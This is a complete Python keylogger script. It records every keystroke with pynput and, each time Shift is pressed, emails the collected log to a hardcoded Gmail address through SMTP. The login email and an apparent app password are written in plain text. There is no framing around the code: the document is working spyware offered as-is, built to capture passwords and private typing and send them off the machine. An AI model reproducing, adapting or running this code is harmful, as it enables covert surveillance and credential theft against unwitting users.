from pynput import keyboard
import time
import threading
import smtplib
########################################################################################################################################
def send_mail(gmail,data):
	server=smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login("leanghorngthelegend@gmail.com","ziys pquh jlbf aqst")
	server.sendmail(gmail,gmail,data)
	server.quit()
def on_press(key):
	try:
		data="{0}".format(key.char)
	except:
		data="{0}".format(key)
	logged_key.append(data)
	if data=="Key.shift":
		send_mail("leanghorngthelegend@gmail.com",str(logged_key))
def listen():
	with keyboard.Listener(on_press=on_press)as listener:
		listener.join()
########################################################################################################################################
logged_key=[]
while True:
	try:
		listen()
	except:
		listen()


